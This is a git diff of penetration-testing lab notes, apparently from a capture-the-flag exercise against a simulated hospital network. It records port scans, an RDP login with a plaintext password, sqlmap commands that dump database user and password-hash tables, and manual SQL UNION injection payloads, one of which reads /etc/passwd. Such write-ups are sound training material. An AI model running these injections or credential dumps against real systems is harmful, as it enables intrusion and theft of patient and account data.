@@ -69,13 +69,13 @@ Host script results:
 | smb2-time: 
 |   date: xxxxx
 |_  start_date: xxxxx
-
-
 ```
 
 > Once the hash of the domain administrator has been recovered, which of the following programs can be used to perform a Pass the Hash attack?
 
 `pth-smbclient`
+
+What is `pth-smbclient`?
 
 ---
 
@@ -107,9 +107,51 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 
 `DLL Hijacking`
 
+use auxiliary/scanner/portscan/syn
+
+```bash
+msf auxiliary(scanner/portscan/syn) > run
+
+[+]  TCP OPEN 10.102xxxxx:3389
+[+]  TCP OPEN 10.102xxxxx:5985
+```
+
+additional <https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp>
+
+<https://www.kali.org/tools/rdesktop/>
+
+```bash
+rdesktop -u <username> <IP>
+
+rdesktop -u douglas 10.102.10.50
+
+Subject: CN=test-pc.armsdon.hospital.local
+     Issuer: CN=test-pc.armsdon.hospital.local
+
+rdesktop -d <domain> -u <username> -p <password> <IP>
+
+rdesktop -d armsdon.hospital.local -u douglas -p '1m1ghtbwrong?' 10.102.10.50
+
+
+```
+
 ---
 
 ## intranet
+
+```bash
+nmap -sS -sC -sV 10.Xxxxx
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-15 19:46 UTC                                                                     
+Nmap scan report for ip-10-102-9-67.eu-west-1.compute.internal (10.XXXXX)
+Host is up (0.000077s latency).                                                                                                            
+Not shown: 999 closed ports                                                                                                                
+PORT   STATE SERVICE VERSION                                                                                                                     
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: QualityCare
+|_Requested resource was http://ip-10-XXXXXXXXXX.eu-west-1.compute.internal/login
+
+```
 
 ```bash
 sqlmap exploit
@@ -128,29 +170,205 @@ available databases [4]:
 [*] mysql
 [*] performance_schema
 [*] qualitycare
+```
 
-
-sqlmap -u URL --batch --passwords
+`sqlmap -u URL --batch --passwords`
 
 database management system users password hashes:
+
+```bash
 [*] root [1]:
     password hash: NULL
+```
+
+time-base blind attach is **SUPER SLOW**, so narrowing it down to a single DB, possible table and better limit to column as well
+
+`sqlmap -u ${URL} --batch -D mysql --dump`
+
+find available databases
+
+`sqlmap -u ${URL} --batch --dbs`
+
+find the tables in the specific database
+
+`sqlmap -u ${URL} --batch -D mysql --tables`
+
+`sqlmap -u ${URL} --batch -D qualitycare --tables`
+
+```bash
+Database: mysql
+[30 tables]
++---------------------------+
+| user                      |
+| column_stats              |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_slave_pos            |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| index_stats               |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| roles_mapping             |
+| servers                   |
+| slow_log                  |
+| table_stats               |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+```
+
+find the columns on the specific table, on the specific database
+
+`sqlmap -u ${URL} --batch -D mysql -T user --columns`
+
+dump the selected values
+
+`sqlmap -u ${URL} --batch -D mysql -T user -C User,Password --dump`
+
+```bash
+Database: mysql
+Table: user
+[1 entry]
++--------+-------------------------------------------+
+| User   | Password                                  |
++--------+-------------------------------------------+
+| root   | *4D4660866D8BB729116A6BBE5913441937DF1432 |
++--------+-------------------------------------------+
+```
+
+checking other databases and their tables
+
+```bash
+sqlmap -u ${URL} --batch -D qualitycare --tables
+
+Database: qualitycare
+[3 tables]
++-----------+
+| hospitals |
+| patients  |
+| users     |
++-----------+
+```
+
+checking which columns we have in this specific table in this specific database
+
+```bash
+sqlmap -u ${URL} --batch -D qualitycare -T users --columns
+
+Database: qualitycare
+Table: users
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| email       | varchar(75)  |
+| hospital_id | int(11)      |
+| id          | int(11)      |
+| password    | varchar(255) |
+| username    | varchar(75)  |
++-------------+--------------+
+```
+
+dump the selected values
+
+`sqlmap -u ${URL} --batch -D qualitycare -T users -C email,hospital_id,id,password,username --dump`
+
+```bash
+Database: qualitycare
+Table: users
+[21 entries]
++-------------------------------------------+-------------+----+-----------------------+-------------------+
+| email                                     | hospital_id | id | password              | username          |
++-------------------------------------------+-------------+----+-----------------------+-------------------+
+(....)
+(....)
+(....)
++-------------------------------------------+-------------+----+-----------------------+-------------------+
+```
+
+checking other tables and columns
+
+`sqlmap -u ${URL} --batch -D qualitycare -T hospitals --columns`
+
+```bash
+Database: qualitycare
+Table: hospitals
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(11)      |
+| name   | varchar(255) |
++--------+--------------+
+```
+
+* dump the selected values
+
+`sqlmap -u ${URL} --batch -D qualitycare -T hospitals -C id,name --dump`
+
+```bash
+Database: qualitycare
+Table: hospitals
+[4 entries]
++----+-------------------+
+| id | name              |
++----+-------------------+
+| 1  | armsdon           |
+| 2  | tadfield          |
+| 3  | walmington-on-sea |
+| 4  | fitton            |
++----+-------------------+
+```
+
+After login with valid user, we can see that is still possible to run a `SQL UNION` injection attack
+
+```bash
+
+' ORDER by 9 #
+
+' UNION SELECT 1,2,3,4,5,6,7,8,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
+
+> hospitals,patients,users
 
 
-# time-base blind attach is SUPER SLOW, so narrowing it down to a single DB, possible table and better limit to coloumn as well
-# sqlmap -u ${URL} --batch -D mysql --dump
+' UNION SELECT 1,2,User,Password,5,6,7,8,9 FROM mysql.user WHERE user="root"#
 
-# find available databases
-sqlmap -u ${URL} --batch --dbs
+' UNION SELECT 1,2,User,Password,5,6,7,8,9 FROM mysql.user#
 
-# find the tables in the specific database
-sqlmap -u ${URL} --batch -D mysql --tables    
+' UNION SELECT 1,Password,User,4,5,6,7,8,9 FROM mysql.user WHERE user="root"#
 
-# find the columns on the specific table, on the specific database
-sqlmap -u ${URL} --batch -D mysql -T users --columns
 
-# dump the selected values...
-sqlmap -u ${URL} --batch -D mysql -T users -C email,password --dump
+additional info - https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
+
+' UNION SELECT 1,user(),database(),version(),5,6,7,8,9 #
+
+qualitycare
+root@localhost 
+
+session_user(),current_user():
+
+version()
+
+load_file(/etc/passwd)
+
+' UNION SELECT 1,2,load_file(/etc/passwd),4,5,6,7,8,9 #    <--this might now work if the `load_file` is disabled on the server.
+
+' UNION SELECT 1,current_user(),session_user(),4,5,6,7,8,9 #
 
 
 ```
